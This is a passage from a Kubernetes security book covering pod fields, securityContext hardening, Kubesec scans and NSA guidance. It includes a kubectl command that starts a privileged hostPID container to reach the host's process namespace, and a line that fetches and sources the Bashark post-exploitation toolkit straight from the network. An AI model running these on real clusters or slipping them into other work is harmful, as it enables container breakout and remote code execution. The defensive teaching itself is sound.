<p>The scheduler<a data-type="indexterm" data-primary="pods" data-secondary="scheduler" id="idm45302817558208"/><a data-type="indexterm" data-primary="scheduler" id="idm45302817557200"/><a data-type="indexterm" data-primary="workloads" data-secondary="scheduler" id="idm45302817556528"/> is responsible for allocating a pod workload to a node. It looks as 
<span class="keep-together">follows:</span></p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">schedulerName</code><code class="p">:</code> <code class="l-Scalar-Plain">default-scheduler</code>
  <code class="nt">tolerations</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">effect</code><code class="p">:</code> <code class="l-Scalar-Plain">NoExecute</code>
    <code class="nt">key</code><code class="p">:</code> <code class="l-Scalar-Plain">node.kubernetes.io/not-ready</code>
    <code class="nt">operator</code><code class="p">:</code> <code class="l-Scalar-Plain">Exists</code>
    <code class="nt">tolerationSeconds</code><code class="p">:</code> <code class="l-Scalar-Plain">300</code>
  <code class="p-Indicator">-</code> <code class="nt">effect</code><code class="p">:</code> <code class="l-Scalar-Plain">NoExecute</code>
    <code class="nt">key</code><code class="p">:</code> <code class="l-Scalar-Plain">node.kubernetes.io/unreachable</code>
    <code class="nt">operator</code><code class="p">:</code> <code class="l-Scalar-Plain">Exists</code>
    <code class="nt">tolerationSeconds</code><code class="p">:</code> <code class="l-Scalar-Plain">300</code></pre>

<p>A hostile scheduler could conceivably exfiltrate data or workloads from the cluster,
but requires the cluster to be compromised in order to add it to the control
plane. It would be easier to schedule a privileged container and root the control plane

<span class="keep-together"><code>kubelets</code>.</span></p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Pod Volume Definitions"><div class="sect2" id="idm45302817502992">
<h2>Pod Volume Definitions</h2>

<p>Here we are <a data-type="indexterm" data-primary="pods" data-secondary="volume definitions" id="idm45302817501264"/><a data-type="indexterm" data-primary="volume definitions, pods" id="idm45302817466064"/>using a bound service account token<a data-type="indexterm" data-primary="bound service account tokens" id="idm45302817465280"/>, defined in YAML as a <a data-type="indexterm" data-primary="projected service account tokens" id="idm45302817464448"/><a data-type="indexterm" data-primary="service accounts" data-secondary="tokens" id="idm45302817463760"/><a data-type="indexterm" data-primary="tokens, service accounts" id="idm45302817462816"/>projected service account token (instead of a
standard service account). The <code>kubelet</code> protects this against exfiltration by regularly rotating it (configured for every
3600 seconds, or one hour), so it’s only of limited use if stolen. An attacker with persistence is still able to use
this value, and can observe its value after it’s rotated, so this only protects the service account after the attack has completed:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">volumes</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">kube-api-access-p282h</code>
    <code class="nt">projected</code><code class="p">:</code>
      <code class="nt">defaultMode</code><code class="p">:</code> <code class="l-Scalar-Plain">420</code>
      <code class="nt">sources</code><code class="p">:</code>
      <code class="p-Indicator">-</code> <code class="nt">serviceAccountToken</code><code class="p">:</code>
          <code class="nt">expirationSeconds</code><code class="p">:</code> <code class="l-Scalar-Plain">3600</code>
          <code class="nt">path</code><code class="p">:</code> <code class="l-Scalar-Plain">token</code>
      <code class="p-Indicator">-</code> <code class="nt">configMap</code><code class="p">:</code>
          <code class="nt">items</code><code class="p">:</code>
          <code class="p-Indicator">-</code> <code class="nt">key</code><code class="p">:</code> <code class="l-Scalar-Plain">ca.crt</code>
            <code class="nt">path</code><code class="p">:</code> <code class="l-Scalar-Plain">ca.crt</code>
          <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">kube-root-ca.crt</code>
      <code class="p-Indicator">-</code> <code class="nt">downwardAPI</code><code class="p">:</code>
          <code class="nt">items</code><code class="p">:</code>
          <code class="p-Indicator">-</code> <code class="nt">fieldRef</code><code class="p">:</code>
              <code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
              <code class="nt">fieldPath</code><code class="p">:</code> <code class="l-Scalar-Plain">metadata.namespace</code>
            <code class="nt">path</code><code class="p">:</code> <code class="l-Scalar-Plain">namespace</code></pre>

<p>Volumes <a data-type="indexterm" data-primary="volumes" data-secondary="security considerations" id="idm45302817457040"/>are a rich source of potential data for an attacker, and you should ensure that standard security practices
like discretionary access control (DAC, e.g., files and permissions) is correctly configured.</p>
<div data-type="tip"><h6>Tip</h6>
<p>The downward API<a data-type="indexterm" data-primary="downward API, capabilities" id="idm45302817367328"/> reflects Kubernetes-level values into the containers in the pod, and is useful to expose things like the
pod’s name, namespace, UID, and labels and annotations into the container. It’s capabilities are
<a href="https://oreil.ly/UyC90">listed in the documentation</a>.</p>
</div>

<p>A container is just Linux, and will not protect its workload<a data-type="indexterm" data-primary="configuration" data-secondary="containers" data-tertiary="workload protection" id="idm45302817364976"/> from incorrect 
<span class="keep-together">configuration.</span></p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Pod Network Status"><div class="sect2" id="idm45302817362912">
<h2>Pod Network Status</h2>

<p>Network information <a data-type="indexterm" data-primary="pods" data-secondary="network status, debugging containers" id="idm45302817361584"/><a data-type="indexterm" data-primary="network status, debugging containers" id="idm45302817360560"/>about the pod is useful to debug containers without services, or that aren’t responding as they
should, but an attacker might use this information to connect directly to a pod without scanning the network:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">status</code><code class="p">:</code>
  <code class="nt">hostIP</code><code class="p">:</code> <code class="l-Scalar-Plain">10.0.1.3</code>
  <code class="nt">phase</code><code class="p">:</code> <code class="l-Scalar-Plain">Running</code>
  <code class="nt">podIP</code><code class="p">:</code> <code class="l-Scalar-Plain">192.168.155.130</code>
  <code class="nt">podIPs</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">ip</code><code class="p">:</code> <code class="l-Scalar-Plain">192.168.155.130</code></pre>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Using the securityContext Correctly"><div class="sect1" id="idm45302818668208">
<h1>Using the securityContext Correctly</h1>

<p>A pod is more<a data-type="indexterm" data-primary="pods" data-secondary="securityContext, configuration considerations" id="pod_seccontext_config"/><a data-type="indexterm" data-primary="configuration" data-secondary="securityContext" id="conf_seccontxt"/><a data-type="indexterm" data-primary="securityContext" data-secondary="configuration considerations" id="secContxt_conf"/> likely to be compromised if a <code>securityContext</code> is not configured, or is too permissive. The <code>securityContext</code> is your
most effective tool to prevent container breakout.</p>

<p>After gaining an RCE into a running pod, the <code>securityContext</code> is the first line of defensive configuration
you have available. It has access to kernel switches that can be set individually. Additional
Linux <a data-type="indexterm" data-primary="LSMs (Linux Security Modules)" data-secondary="configuration" id="idm45302817337024"/>Security Modules can be configured with fine-grained policies that prevent
hostile applications taking advantage of your systems.</p>

<p>Docker’s <code>containerd</code> has<a data-type="indexterm" data-primary="Docker" data-secondary="containerd, seccomp profile" id="idm45302817334656"/><a data-type="indexterm" data-primary="containerd" data-secondary="seccomp profile" id="idm45302817333680"/><a data-type="indexterm" data-primary="seccomp" data-secondary="profile" id="idm45302817306352"/> a default <code>seccomp</code> profile that has prevented some <a data-type="indexterm" data-primary="zero-day attacks" data-secondary="seccomp profile" id="idm45302817304992"/>zero-day attacks against the container
runtime by blocking system calls in the kernel. From Kubernetes v1.22 you should enable this by default for
all runtimes with the 
<span class="keep-together"><code>--seccomp-default</code></span> <code>kubelet</code> flag. In some cases workloads may not run with the default
profile: observability or security tools may require low-level kernel access. These workloads should have custom
<code>seccomp</code> profiles written (rather than resorting to running them <code>Unconfined</code>, which allows any system call).</p>

<p>Here’s an example of a fine-grained <code>seccomp</code> profile loaded from the host’s filesystem under
<code>/var/lib/kubelet/seccomp</code>:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">securityContext</code><code class="p">:</code>
    <code class="nt">seccompProfile</code><code class="p">:</code>
      <code class="nt">type</code><code class="p">:</code> <code class="l-Scalar-Plain">Localhost</code>
      <code class="nt">localhostProfile</code><code class="p">:</code> <code class="l-Scalar-Plain">profiles/fine-grained.json</code></pre>

<p><code>seccomp</code> is for system calls, but SELinux<a data-type="indexterm" data-primary="SELinux, policy enforcement" id="idm45302817292128"/><a data-type="indexterm" data-primary="AppArmor" data-secondary="policy enforcement" id="idm45302817291472"/> and AppArmor can monitor and enforce policy in userspace too, protecting
files, directories, and devices.</p>

<p>SELinux configuration is able to block most container breakouts (excluding with a label-based approach to filesystem and
process access) as it doesn’t allow containers to write anywhere but their own filesystem, nor to read other directories,
and comes enabled on OpenShift and Red Hat Linuxes.</p>

<p>AppArmor can similarly monitor and prevent many attacks in Debian-derived Linuxes. If AppArmor is enabled,
then <code>cat /sys/module/apparmor/parameters/enabled</code> returns <code>Y</code>, and it can be used in pod definitions:</p>
<pre data-type="programlisting" data-code-language="yaml" class="small no-indent">
<code class="nt">annotations</code><code class="p">:</code>
  <code class="nt">container.apparmor.security.beta.kubernetes.io/hello</code><code class="p">:</code> <code class="l-Scalar-Plain">localhost/k8s-apparmor-example-deny-write</code>
</pre>

<p>The <code>privileged</code> flag <a data-type="indexterm" data-primary="privileged flag" id="idm45302817286096"/><a data-type="indexterm" data-primary="securityContext" data-secondary="privileged flag" id="idm45302817284288"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="privileged flag" id="idm45302817283344"/>was quoted as being “the most dangerous flag in the history of computing” by Liz Rice, but why are
privileged containers so dangerous? Because they leave the process namespace enabled to give the illusion of
containerization, but actually disable all security features.</p>

<p>“Privileged” is a specific <code>securityContext</code> configuration: all but the process namespace is disabled, virtual filesystems
are unmasked, LSMs are disabled, and all capabilities are granted.</p>

<p>Running as a nonroot user without capabilities, and setting <code>AllowPrivilegeEscalation</code> to <a data-type="indexterm" data-primary="AllowPrivilegeEscalation" id="idm45302817250816"/><a data-type="indexterm" data-primary="privilege escalation" data-secondary="AllowPrivilegeEscalation" id="idm45302817250096"/><code>false</code> provides a robust
protection against many privilege escalations:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">spec</code><code class="p">:</code>
  <code class="nt">containers</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">image</code><code class="p">:</code> <code class="l-Scalar-Plain">controlplane/hack</code>
    <code class="nt">securityContext</code><code class="p">:</code>
      <code class="nt">allowPrivilegeEscalation</code><code class="p">:</code> <code class="l-Scalar-Plain">false</code></pre>

<p>The granularity of security contexts means each property of the configuration must be tested to ensure it is not set:
as a defender by configuring admission control and testing YAML or as an attacker with a dynamic test (or
<a href="https://oreil.ly/BIQCJ">amicontained</a>) at runtime.</p>
<div data-type="tip"><h6>Tip</h6>
<p>We explore how to detect privileges inside a container later in this chapter.</p>
</div>

<p>Sharing namespaces with the host also reduces the isolation of the container and opens it to greater potential risk.
Any mounted filesystems effectively add to the mount namespace.</p>

<p>Ensure your pods’ <code>securityContext</code>s are correct and your systems will be safer against known<a data-type="indexterm" data-primary="pods" data-secondary="securityContext, configuration considerations" data-startref="pod_seccontext_config" id="idm45302817214272"/><a data-type="indexterm" data-primary="configuration" data-secondary="securityContext" data-startref="conf_seccontxt" id="idm45302817213056"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="configuration considerations" data-startref="sec_secContxt_conf" id="idm45302817211840"/> attacks.</p>








<section data-type="sect2" data-pdf-bookmark="Enhancing the securityContext with Kubesec"><div class="sect2" id="idm45302817210080">
<h2>Enhancing the securityContext with Kubesec</h2>

<p><a href="https://kubesec.io">Kubesec</a> is a<a data-type="indexterm" data-primary="securityContext" data-secondary="Kubesec" id="idm45302817207984"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="Kubesec" id="idm45302817206976"/><a data-type="indexterm" data-primary="Kubesec" data-secondary="securityContext" id="idm45302817205760"/> simple tool to validate the security of a Kubernetes resource.</p>

<p>It returns a risk score for the resource, and advises on how to tighten the
<code>securityContext</code> (note that we edited the output to fit):</p>
<pre data-type="programlisting" data-code-language="bash" class="small no-indent">

<code class="nv">$ </code>cat <code class="s">&lt;&lt;EOF &gt; kubesec-test.yaml</code>
<code class="s">apiVersion: v1</code>
<code class="s">kind: Pod</code>
<code class="s">metadata:</code>
<code class="s">  name: kubesec-demo</code>
<code class="s">spec:</code>
<code class="s">  containers:</code>
<code class="s">  - name: kubesec-demo</code>
<code class="s">    image: gcr.io/google-samples/node-hello:1.0</code>
<code class="s">    securityContext:</code>
<code class="s">      readOnlyRootFilesystem: true</code>
<code class="s">EOF</code>

<code class="nv">$ </code>docker run -i kubesec/kubesec:2.11.1 scan - &lt; kubesec-test.yaml
<code class="o">[</code> <code class="o">{</code>
 <code class="s2">"object"</code>: <code class="s2">"Pod/kubesec-demo.default"</code>,
 <code class="s2">"valid"</code>: <code class="nb">true</code>,
 <code class="s2">"fileName"</code>: <code class="s2">"STDIN"</code>,
 <code class="s2">"message"</code>: <code class="s2">"Passed with a score of 1 points"</code>,
 <code class="s2">"score"</code>: 1,
 <code class="s2">"scoring"</code>: <code class="o">{</code>
   <code class="s2">"passed"</code>: <code class="o">[{</code>
      <code class="s2">"id"</code>: <code class="s2">"ReadOnlyRootFilesystem"</code>,
        <code class="s2">"selector"</code>: <code class="s2">"containers[].securityContext.readOnlyRootFilesystem == true"</code>,
        <code class="s2">"reason"</code>: <code class="s2">"An immutable root filesystem can ... increase attack cost"</code>,
        <code class="s2">"points"</code>: 1
        <code class="o">}</code>
    <code class="o">]</code>,
    <code class="s2">"advise"</code>: <code class="o">[{</code>
      <code class="s2">"id"</code>: <code class="s2">"ApparmorAny"</code>,
      <code class="s2">"selector"</code>: <code class="s2">".metadata.annotations.container.apparmor.security.beta.kubernetes.io/nginx"</code>,
      <code class="s2">"reason"</code>: <code class="s2">"Well defined AppArmor ... WARNING: NOT PRODUCTION READY"</code>,
      <code class="s2">"points"</code>: 3
    <code class="o">}</code>,
...
</pre>

<p><a href="https://kubesec.io">Kubesec.io</a> documents practical changes to make to your securityContext, and we’ll document
some of them here.</p>
<div data-type="tip"><h6>Tip</h6>
<p>Shopify’s excellent <a href="https://oreil.ly/LHy2P">kubeaudit</a> provides <a data-type="indexterm" data-primary="kubeaudit" id="idm45302817085904"/>similar functionality for all resources
in a cluster.</p>
</div>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Hardened securityContext"><div class="sect2" id="idm45302817084720">
<h2>Hardened securityContext</h2>

<p>The NSA<a data-type="indexterm" data-primary="NSA (National Security Agency), Kubernetes hardening standards" id="NSA_Khs"/><a data-type="indexterm" data-primary="National Security Agency (NSA), Kubernetes hardening standards" id="NSA_khs"/><a data-type="indexterm" data-primary="Kubernetes Hardening Guidance (NSA)" id="KHG"/><a data-type="indexterm" data-primary="securityContext" data-secondary="NSA hardening standards" id="secContxt_NSA"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="NSA hardening standards" id="sec_secContxt_NSA"/> published <a href="https://oreil.ly/2riDP">“Kubernetes Hardening
Guidance”</a>, which recommends a hardened set of <code>securityContext</code> standards. It recommends scanning for
vulnerabilities and misconfigurations, least privilege, good RBAC and IAM, network firewalling and encryption, and “to
periodically review all Kubernetes settings and use vulnerability scans to help ensure risks are appropriately accounted
for and security patches are applied.”</p>

<p>Assigning least privilege to a container in a pod is the responsibility of the <code>securityContext</code>
(see details in <a data-type="xref" href="#sec-context-fields">Table 2-2</a>). Note that the PodSecurityPolicy resource discussed
in <a data-type="xref" href="ch08.xhtml#policy-runtime-policies">“Runtime Policies”</a> maps onto the config <a data-type="indexterm" data-primary="securityContext" data-secondary="fields" id="idm45302817073264"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="fields" id="idm45302817072288"/><a data-type="indexterm" data-primary="fields, securityContext" id="idm45302817071072"/>flags available in <code>securityContext</code>.</p>
<table id="sec-context-fields" style="width: 100%">
<caption><span class="label">Table 2-2. </span><code>securityContext fields</code></caption>
<thead>
<tr>
<th>Field name(s)</th>
<th>Usage</th>
<th>Recommendations</th>
</tr>
</thead>
<tbody>
<tr>
<td><p><code>privileged</code></p></td>
<td><p>Controls whether pods can run privileged containers.</p></td>
<td><p>Set to <code>false</code>.</p></td>
</tr>
<tr>
<td><p><code>hostPID</code>, <code>hostIPC</code></p></td>
<td><p>Controls whether containers can share host process namespaces.</p></td>
<td><p>Set to <code>false</code>.</p></td>
</tr>
<tr>
<td><p><code>hostNetwork</code></p></td>
<td><p>Controls whether containers can use the host network.</p></td>
<td><p>Set to <code>false</code>.</p></td>
</tr>
<tr>
<td><p><code>allowedHostPaths</code></p></td>
<td><p>Limits containers to specific paths of the host filesystem.</p></td>
<td><p>Use a “dummy” path name (such as <code>/foo</code> marked as read-only). Omitting this field results in no admission restrictions being placed on containers.</p></td>
</tr>
<tr>
<td><p><code>readOnlyRootFilesystem</code></p></td>
<td><p>Requires the use of a read only root filesystem.</p></td>
<td><p>Set to <code>true</code> when possible.</p></td>
</tr>
<tr>
<td><p><code>runAsUser</code>, <code>runAsGroup</code>, <code>supplementalGroups</code>, <code>fsGroup</code></p></td>
<td><p>Controls whether container applications can run with root privileges or with root group membership.</p></td>
<td><p>Set <code>runAsUser</code> to <code>MustRunAsNonRoot</code>.
</p><p>Set <code>runAsGroup</code> to <code>nonzero</code>.
</p><p>Set <code>supplementalGroups</code> to <code>nonzero</code>.
</p><p>Set <code>fsGroup</code> to <code>nonzero</code>.</p></td>
</tr>
<tr>
<td><p><code>allowPrivilegeEscalation</code></p></td>
<td><p>Restricts escalation to root privileges.</p></td>
<td><p>Set to <code>false</code>. This measure is required to effectively enforce <code>runAsUser: MustRunAsNonRoot</code> settings.</p></td>
</tr>
<tr>
<td><p><code>SELinux</code></p></td>
<td><p>Sets the SELinux context of the container.</p></td>
<td><p>If the environment supports SELinux, consider adding SELinux labeling to further harden the container.</p></td>
</tr>
<tr>
<td><p><code>AppArmor</code> annotations</p></td>
<td><p>Sets the AppArmor profile used by containers.</p></td>
<td><p>Where possible, harden containerized applications by employing AppArmor to constrain exploitation.</p></td>
</tr>
<tr>
<td><p><code>seccomp</code> annotations</p></td>
<td><p>Sets the <code>seccomp</code> profile used to sandbox containers.</p></td>
<td><p>Where possible, use a <code>seccomp</code> auditing profile to identify required syscalls for running applications; then enable a <code>seccomp</code> profile to block all other syscalls.</p></td>
</tr>
</tbody>
</table>

<p>Let’s explore these in more detail using the<a data-type="indexterm" data-primary="Kubesec" data-secondary="resources, examining" id="kubesec_resourc"/><a data-type="indexterm" data-primary="resources" data-secondary="examining" id="resourc_examin"/> <code>kubesec</code> static analysis tool, and the selectors it uses to interrogate your Kubernetes resources.</p>










<section data-type="sect3" data-pdf-bookmark="containers[] .securityContext .privileged"><div class="sect3" id="idm45302817026688">
<h3>containers[] .securityContext .privileged</h3>

<p>A privileged container <a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="privileged containters" id="idm45302817025328"/><a data-type="indexterm" data-primary="securityContext" data-secondary="privileged containters" id="idm45302817024048"/><a data-type="indexterm" data-primary=".privileged" data-primary-sortas="privileged" id="idm45302817023104"/><a data-type="indexterm" data-primary="containers" data-secondary="privileged" id="idm45302817022160"/>running is potentially a bad day for your security team. Privileged containers disable
namespaces (except <code>process</code>) and LSMs, grant all capabilities, expose the host’s devices through <em>/dev</em>, and generally
make things insecure by default. This is the first thing an attacker looks for in a newly compromised pod.</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark=".spec .hostPID"><div class="sect3" id="idm45302817019760">
<h3>.spec .hostPID</h3>

<p><code>hostPID</code> allows <a data-type="indexterm" data-primary=".hostPID" data-primary-sortas="hostPID" id="idm45302817017968"/>traversal from the container to the host through the <em>/proc</em> filesystem, which symlinks other
processes’ root filesystems. To read from the host’s process namespace, <code>privileged</code> is needed as well:</p>

<pre data-type="programlisting" data-code-language="console"><code class="go">user@host $ OVERRIDES='{"spec":{"hostPID": true,''"containers":[{"name":"1",'
</code><code class="go">user@host $ OVERRIDES+='"image":"alpine","command":["/bin/ash"],''"stdin": true,'
</code><code class="go">user@host $ OVERRIDES+='"tty":true,"imagePullPolicy":"IfNotPresent",'
</code><code class="go">user@host $ OVERRIDES+='"securityContext":{"privileged":true}}]}}'
</code><code class="go">
</code><code class="go">user@host $ kubectl run privileged-and-hostpid --restart=Never -it --rm \
</code><code class="go">  --image noop --overrides "${OVERRIDES}" </code><a class="co" id="co_pod_level_resources_CO3-1" href="#callout_pod_level_resources_CO3-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a><code class="go">
</code><code class="go">
</code><code class="go">/ # grep PRETTY_NAME /etc/*release* </code><a class="co" id="co_pod_level_resources_CO3-2" href="#callout_pod_level_resources_CO3-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a><code class="go">
</code><code class="go">PRETTY_NAME="Alpine Linux v3.14"
</code><code class="go">
</code><code class="go">/ # ps faux | head </code><a class="co" id="co_pod_level_resources_CO3-3" href="#callout_pod_level_resources_CO3-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a><code class="go">
</code><code class="go">PID   USER     TIME  COMMAND
</code><code class="go">    1 root      0:07 /usr/lib/systemd/systemd noresume noswap cros_efi
</code><code class="go">    2 root      0:00 [kthreadd]
</code><code class="go">    3 root      0:00 [rcu_gp]
</code><code class="go">    4 root      0:00 [rcu_par_gp]
</code><code class="go">    6 root      0:00 [kworker/0:0H-kb]
</code><code class="go">    9 root      0:00 [mm_percpu_wq]
</code><code class="go">   10 root      0:00 [ksoftirqd/0]
</code><code class="go">   11 root      1:33 [rcu_sched]
</code><code class="go">   12 root      0:00 [migration/0]
</code><code class="go">
</code><code class="go">/ # grep PRETTY_NAME /proc/1/root/etc/*release </code><a class="co" id="co_pod_level_resources_CO3-4" href="#callout_pod_level_resources_CO3-4"><img src="Images/4.png" alt="4" width="12" height="12"/></a><code class="go">
</code><code class="go">/proc/1/root/etc/os-release:PRETTY_NAME="Container-Optimized OS from Google"</code></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_pod_level_resources_CO3-1" href="#co_pod_level_resources_CO3-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>Start a privileged container and share the host process namespace.</p></dd>
<dt><a class="co" id="callout_pod_level_resources_CO3-2" href="#co_pod_level_resources_CO3-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></dt>
<dd><p>As the root user in the container, check the container’s operating system version.</p></dd>
<dt><a class="co" id="callout_pod_level_resources_CO3-3" href="#co_pod_level_resources_CO3-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a></dt>
<dd><p>Verify we’re in the host’s process namespace (we can see PID 1, and kernel helper processes).</p></dd>
<dt><a class="co" id="callout_pod_level_resources_CO3-4" href="#co_pod_level_resources_CO3-4"><img src="Images/4.png" alt="4" width="12" height="12"/></a></dt>
<dd><p>Check the distribution version of the host, via the <em>/proc</em> filesystem inside the containe. This is possible because the PID namespace is shared with the host.</p></dd>
</dl>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>Without <code>privileged</code>, the host process namespace is inaccessible to root in the container:</p>

<pre data-type="programlisting" data-code-language="shell">/ <code class="nv">$ </code>grep PRETTY_NAME /proc/1/root/etc/*release*
grep: /proc/1/root/etc/*release*: Permission denied</pre>

<p>In this case the attacker is limited to searching the filesystem or memory as their UID allows, hunting for key
material or sensitive data.</p>
</div>
</div></section>













<section data-type="sect3" data-pdf-bookmark=".spec .hostNetwork"><div class="sect3" id="idm45302816909760">
<h3>.spec .hostNetwork</h3>

<p>Host networking access <a data-type="indexterm" data-primary=".hostNetwork" data-primary-sortas="hostNetwork" id="idm45302816930640"/>allows us to sniff <a data-type="indexterm" data-primary="traffic" data-secondary="sniffing" id="idm45302816929504"/><a data-type="indexterm" data-primary="traffic" data-secondary="fake, sending" id="idm45302816927008"/>traffic or send fake traffic over the host adapter (but only if we have
permission to do so, enabled by <code>CAP_NET_RAW</code> or <code>CAP_NET_ADMIN</code>), and evade network<a data-type="indexterm" data-primary="network policies" data-secondary="evading" id="idm45302816924976"/> policy (which depends on
traffic originating from the expected source IP of the adapter in the pod’s network namespace).</p>

<p>It also grants access to services bound to the host’s <a data-type="indexterm" data-primary="hosts, accessing loopback adapter" id="idm45302816923216"/><a data-type="indexterm" data-primary="loopback adapter, accessing" id="idm45302816922544"/>loopback adapter (<code>localhost</code> in the root network namespace) that
traditionally was considered a security boundary. <a data-type="indexterm" data-primary="Server Side Request Forgery (SSRF)" id="idm45302816921360"/><a data-type="indexterm" data-primary="SSRF (Server Side Request Forgery)" id="idm45302816920688"/><a data-type="indexterm" data-primary="attacks" data-secondary="SSRF" id="idm45302816920000"/>Server Side Request Forgery (SSRF) attacks have reduced
the incidence of this pattern, but it may still exist (Kubernetes’ API server <code>--insecure-port</code> used this pattern
until it was deprecated in v1.10 and finally removed in v1.20).</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark=".spec .hostAliases"><div class="sect3" id="idm45302816918256">
<h3>.spec .hostAliases</h3>

<p>Permits<a data-type="indexterm" data-primary=".hostAliases" data-primary-sortas="hostAliases" id="idm45302816916928"/> pods to override their local <em>/etc/hosts</em> files. This may have more operational implications (like not being
updated in a timely manner and causing an outage) than security connotations.</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark=".spec .hostIPC"><div class="sect3" id="idm45302816914992">
<h3>.spec .hostIPC</h3>

<p>Gives the <a data-type="indexterm" data-primary=".hostIPC" data-primary-sortas="hostIPC" id="idm45302816913664"/>pod access to the host’s <a data-type="indexterm" data-primary="Interprocess Communication namespace" id="idm45302816892144"/><a data-type="indexterm" data-primary="namespaces" data-secondary="Interprocess Communication" id="idm45302816891536"/>Interprocess Communication namespace, where it may be able to interfere with trusted processes on the host. It’s likely this will enable simple host compromise via <em>/usr/bin/ipcs</em> or files in shared memory at <em>/dev/shm</em>.</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark="containers[] .securityContext .runAsNonRoot"><div class="sect3" id="idm45302816889312">
<h3>containers[] .securityContext .runAsNonRoot</h3>

<p>The root<a data-type="indexterm" data-primary=".runAsNonRoot" data-primary-sortas="runAsNonRoot" id="idm45302816887984"/> user <a data-type="indexterm" data-primary="root users" id="idm45302816886848"/>has special permissions in a Linux system, and although the permissions set is reduced <a data-type="indexterm" data-primary="securityContext" data-secondary=".runAsNonRoot" data-secondary-sortas="runAsNonRoot" id="idm45302816886016"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary=".runAsNonRoot" data-tertiary-sortas="runAsNonRoot" id="idm45302816884800"/>within a container, the root user is still treated differently by lots of kernel code.</p>

<p>Preventing root from owning the processes inside the container is a simple and effective <a data-type="indexterm" data-primary="security" data-secondary="root users" id="idm45302816882688"/>security measure. It stops
many of the <a data-type="indexterm" data-primary="container breakouts" data-secondary="root user permissions" id="idm45302816881536"/>container breakout attacks listed in this book, and adheres to standard and established Linux security
practice.</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark="containers[] .securityContext .runAsUser &gt; 10000"><div class="sect3" id="idm45302816880080">
<h3>containers[] .securityContext .runAsUser &gt; 10000</h3>

<p>In addition to <a data-type="indexterm" data-primary="securityContext" data-secondary=".runAsUser" data-secondary-sortas="runAsUser" id="idm45302816878752"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary=".runAsUser" data-tertiary-sortas="runAsUser" id="idm45302816877472"/>preventing root <a data-type="indexterm" data-primary=".runAsUser &gt; 10000" data-primary-sortas="runAsUser &gt; 10000" id="idm45302816875856"/>running processes, enforcing high UIDs for containerized processes lowers the risk of
breakout without user namespaces: if the user in the container (e.g., 12345) has an equivalent UID on the host (that is,
also 12345), and the user in the container is able to reach them through mounted volume or shared namespace, then
resources may accidentally be shared and allow container breakout (e.g., filesystem permissions and authorization
checks).</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark="containers[] .securityContext .readOnlyRootFilesystem"><div class="sect3" id="idm45302816874032">
<h3>containers[] .securityContext .readOnlyRootFilesystem</h3>

<p>Immutability <a data-type="indexterm" data-primary=".readOnlyRootFilesystem" data-primary-sortas="readOnlyRootFilesystem" id="idm45302816872304"/>is <a data-type="indexterm" data-primary="securityContext" data-secondary=".readOnlyRootFilesystem" data-secondary-sortas="readOnlyRootFilesystem" id="idm45302816871200"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary=".readOnlyRootFilesystem" data-tertiary-sortas="readOnlyRootFilesystem" id="idm45302816869920"/>not a security boundary as code can be downloaded from the internet and run by an interpreter
(such as Bash, PHP, and Java) without using the filesystem, as the <code>bashark</code> post-exploitation toolkit<a data-type="indexterm" data-primary="bashark post-exploitation toolkit" id="idm45302816867744"/><a data-type="indexterm" data-primary="toolkits, bashark" id="idm45302816866976"/> shows:</p>
<pre data-type="programlisting" data-code-language="bash" class="small no-indent">
root@r00t:/tmp <code class="o">[</code>0<code class="o">]</code><code class="c"># source &lt;(curl -s \</code>
  https://raw.githubusercontent.com/redcode-labs/Bashark/master/bashark.sh<code class="o">)</code>

__________               .__                  __               ________     _______
<code class="se">\_</code>_____   <code class="se">\_</code>____    _____<code class="p">|</code>  <code class="p">|</code>__ _____ _______<code class="p">|</code>  <code class="p">|</code> __ ___  __   <code class="se">\_</code>____  <code class="se">\ </code>   <code class="se">\ </code>  _  <code class="se">\</code>
 <code class="p">|</code>    <code class="p">|</code>  _/<code class="se">\_</code>_  <code class="se">\ </code> /  ___/  <code class="p">|</code>  <code class="se">\\</code>__  <code class="se">\\</code>_  __ <code class="se">\ </code> <code class="p">|</code>/ / <code class="se">\ </code> <code class="se">\/</code> /    /  ____/    /  /_<code class="se">\ </code> <code class="se">\</code>
